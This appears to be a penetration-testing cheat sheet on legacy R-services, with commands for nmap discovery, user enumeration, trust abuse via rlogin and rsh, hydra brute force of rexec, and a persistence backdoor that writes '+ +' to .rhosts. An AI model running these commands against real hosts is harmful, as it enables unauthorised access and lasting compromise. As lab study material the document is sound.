# R-Services
```table-of-contents
```
## Theory: The "R" Commands
| **Command** | **Daemon** | **Port** | **Protocol** | **Description**                                                                                         |
| ----------- | ---------- | -------- | ------------ | ------------------------------------------------------------------------------------------------------- |
| `rexec`     | `rexecd`   | 512      | TCP          | **Remote Execution.** Runs shell commands. Requires username/password auth (sent in plain text).        |
| `rlogin`    | `rlogind`  | 513      | TCP          | **Remote Login.** Interactive shell (like Telnet). Can bypass password if coming from a trusted host.   |
| `rsh`       | `rshd`     | 514      | TCP          | **Remote Shell.** Executes commands without login. Relies on `/etc/hosts.equiv` or `.rhosts` for trust. |
| `rcp`       | `rshd`     | 514      | TCP          | **Remote Copy.** Copies files between systems. Uses the same trust model as rsh.                        |
## Discovery
```shell
# Nmap - Version Scan
nmap -sV -p 512,513,514 <IP>

# Nmap - Check for open relay/trust
nmap -p 514 --script rlogin-vuln <IP>
```
## User Enumeration
```shell
# rusers - List logged-in users via RPC
# -a: All users | -l: Long format
rusers -al <IP>

# rwho - List users on the local network
rwho
```
## Exploitation: Abusing Trust
### Remote Login (rlogin)
```shell
# Log in as a specific user (e.g., root or student)
rlogin -l <USERNAME> <IP>

# If successful, you drop straight into a shell without a password prompt.
```
### Remote Shell Execution (rsh)
```shell
# Check who you are
rsh -l <USERNAME> <IP> "whoami"

# Upload a file (using cat redirection)
cat local_file.txt | rsh -l <USERNAME> <IP> "cat > remote_file.txt"
```
### Password Brute Force (rexec)
```shell
# Hydra
hydra -l <USER> -P passwords.txt exec://<IP>
```
## Post-Exploitation & Configuration
### 1. Global Trust (`/etc/hosts.equiv`)
```shell
cat /etc/hosts.equiv

# Example Content:
# pwnbox      caulk  <-- User 'caulk' from host 'pwnbox' is trusted
# +           +         <-- CRITICAL: All hosts and users are trusted
```
### 2. User Trust (`~/.rhosts`)
```shell
cat ~/.rhosts

# Example Content:
# 10.0.17.5   htb-student
# +           +
```
### 3. Persistence (Backdoor)
```shell
echo "+ +" > ~/.rhosts
# OR
echo "10.10.14.X root" >> /root/.rhosts
```